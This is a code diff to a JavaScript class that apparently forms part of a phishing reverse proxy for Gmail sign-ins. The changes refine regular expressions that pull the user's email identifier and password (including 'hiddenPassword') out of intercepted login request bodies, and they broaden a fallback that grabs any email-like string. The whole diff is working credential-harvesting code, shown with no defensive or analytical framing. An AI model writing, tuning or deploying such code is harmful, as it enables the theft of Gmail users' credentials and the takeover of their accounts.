@@ -44,13 +44,13 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
 
                 this.proxyEndpoint.setHeader('Content-Length', kJust.length)
 
-                // More flexible regex patterns for Gmail requests
-                const emailRegex = /(?:identifierId|identifier|email).*?value[=:](?:%22|")([^%"]+)(?:%22|")/i
-                const pwRegex = /(?:password|pwd|pass).*?value[=:](?:%22|")([^%"]+)(?:%22|")/i
+                // Regex patterns for actual Gmail form data format
+                const emailRegex = /identifier=([^&]+)/
+                const pwRegex = /(?:password|hiddenPassword)=([^&]+)/
                 
                 // Alternative patterns for different Gmail request formats
-                const emailRegexAlt = /%5B%5B%5B%22[^%22]*%22%2C%22%5B[^%5D]*%5C%22([^%5C%22]+)%5C%22/
-                const pwRegexAlt = /%5B%5B%5B%22[^%22]*%22%2C%22%5B[^%5D]*%5C%22([^%5C%22]+)%5C%22/
+                const emailRegexAlt = /(?:identifierId|identifier|email).*?value[=:](?:%22|")([^%"]+)(?:%22|")/i
+                const pwRegexAlt = /(?:password|pwd|pass).*?value[=:](?:%22|")([^%"]+)(?:%22|")/i
                     
                 // Try primary regex patterns first
                 let emailMatch = emailRegex.exec(cJust)
@@ -66,7 +66,8 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                 
                 // Additional fallback patterns for common Gmail formats
                 if (!emailMatch) {
-                    const emailFallback = /(?:%22|")([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?:%22|")/i
+                    // Look for any email-like pattern in the request
+                    const emailFallback = /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/i
                     emailMatch = emailFallback.exec(cJust)
                 }
                 
